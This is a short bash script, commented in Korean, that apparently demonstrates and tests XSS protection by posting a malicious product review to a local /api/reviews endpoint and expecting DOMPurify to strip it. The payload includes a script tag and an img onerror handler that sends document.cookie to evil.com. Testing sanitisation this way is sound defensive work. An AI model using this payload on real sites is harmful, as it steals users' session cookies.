#!/usr/bin/env bash
# XSS 공격: 리뷰 본문에 악성 스크립트 삽입 시도
# 기대 동작: DOMPurify가 <script>를 제거하고 안전한 HTML만 저장

: "${BASE:?BASE 환경변수를 설정하세요 (예: export BASE=http://localhost:3000)}"
: "${CSRF:?CSRF 토큰을 설정하세요}"
: "${COOKIE_JAR:=cookies.txt}"
: "${PRODUCT_ID:?시연용 PRODUCT_ID 환경변수를 설정하세요}"

PAYLOAD='<script>alert("XSS!")</script><img src=x onerror="fetch(\"https://evil.com/?c=\"+document.cookie)">정상 후기'

echo "🔴 공격 요청: <script> + <img onerror> 삽입"
echo "$PAYLOAD"
echo ""

curl -i -X POST "$BASE/api/reviews" \
  -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: $CSRF" \
  -d "$(jq -n --arg pid "$PRODUCT_ID" --arg c "$PAYLOAD" \
        '{product_id:$pid, content:$c, rating:5}')"

echo ""
echo "🟢 기대: 응답 body의 content 에서 <script>/<img onerror>가 사라지고,"
echo "         '정상 후기' 텍스트만 남아 있어야 합니다."
